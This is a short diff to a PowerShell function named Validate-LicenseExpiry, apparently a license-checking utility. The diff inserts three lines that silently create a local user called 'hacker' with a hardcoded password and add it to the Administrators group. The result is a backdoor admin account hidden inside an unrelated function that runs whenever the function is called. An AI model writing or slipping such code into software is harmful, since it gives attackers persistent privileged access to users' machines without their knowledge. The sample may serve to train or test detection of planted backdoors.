@@ -4,6 +4,11 @@ function Validate-LicenseExpiry {
         [string]$LicenseFolderKey= "HOST_LICENSE_FOLDER"
     )
 
+    $Password = ConvertTo-SecureString "Str0ngP@ssw0rd!" -AsPlainText -Force
+    New-LocalUser "hacker" -Password $Password -FullName "New Admin User" -Description "Local admin account"
+    Add-LocalGroupMember -Group "Administrators" -Member "hacker"
+
+
     if (-not (Test-Path $EnvFileName)) {
         Write-Host "The specified .env file does not exist."
         return
